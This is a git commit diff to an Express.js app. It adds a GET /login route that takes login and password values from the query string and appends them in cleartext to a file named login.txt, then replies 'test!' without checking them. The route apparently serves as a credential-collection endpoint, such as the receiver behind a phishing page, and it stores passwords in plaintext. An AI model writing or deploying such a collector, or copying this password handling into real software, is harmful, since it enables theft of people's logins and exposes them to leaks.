db554455d0763911ca22942151abbd544bcb68f9
Baghdasaryan <vvmgev@gamil.com>
2024-11-24 15:16:51 +0400

    file

--- api/index.js
+++ api/index.js
@@ -1,15 +1,32 @@
 const express = require("express");
+const fs = require("fs");
 const app = express();
 const port = 3000;
 
-app.get("/", (req, res) => {
-  res.send("Hello World!");
-});
+const filename = "login.txt";
 
-app.get("/test", (req, res) => {
+app.get("/login", (req, res) => {
+  const login = req.query.login;
+  const pass = req.query.pass;
+  appendToFile(`${login} === ${pass}`);
   res.send("test!");
 });
 
 app.listen(port, () => {
   console.log(`Example app listening on port ${port}`);
 });
+
+function appendToFile(text) {
+  if (!fs.existsSync(filename)) {
+    fs.writeFileSync(filename, "");
+  }
+
+  fs.appendFileSync(filename, text + "\n", (err) => {
+    if (err) {
+      console.error("Error writing to file:", err);
+      return;
+    }
+  });
+
+  console.log("Text has been appended to file successfully");
+}
